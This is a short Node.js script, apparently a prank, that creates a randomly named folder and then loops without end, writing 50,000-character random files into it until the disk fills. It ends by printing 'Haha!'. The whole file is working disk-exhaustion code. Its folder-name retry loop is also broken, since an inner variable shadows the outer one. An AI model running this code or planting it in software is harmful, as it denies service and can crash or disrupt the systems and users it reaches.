const fs = require("fs")
const randomstring = require("randomstring");

let cwd = process.cwd();
let tmpDir = '';
let tmpFolderName = randomstring.generate({
    length: 10,
    charset: 'alphabetic'
});

const bloater = () => {
    let bloatName = randomstring.generate({
        length: 30,
        charset: 'alphabetic'
    });
    let bloat = randomstring.generate({
        length: 50000,
        charset: 'alphabetic'
    });

    fs.writeFileSync(tmpDir + '\\' + bloatName, bloat, err => {
        if (err) {
            console.error(err)
            return
        }
        //file written successfully
    })
}

while (fs.existsSync(cwd + '\\' + tmpFolderName)) {
    let tmpFolderName = randomstring.generate({
        length: 10,
        charset: 'alphabetic'
    });
}

tmpDir = cwd + '\\' + tmpFolderName;

fs.mkdirSync(tmpDir, {
    recursive: true
});

let count = 10;

while (1) {
    count--;
    bloater();
    console.log(count);
}









console.log(tmpDir);
console.log('Haha!');